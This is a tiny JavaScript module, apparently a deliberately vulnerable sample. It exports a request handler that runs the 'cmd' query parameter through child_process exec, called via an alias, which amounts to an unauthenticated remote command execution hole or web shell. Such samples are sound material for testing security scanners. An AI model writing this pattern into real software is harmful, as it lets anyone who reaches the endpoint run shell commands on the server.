import { exec } from 'child_process';

const runner = exec;

export function handler(req) {
  runner(req.query.cmd);
}
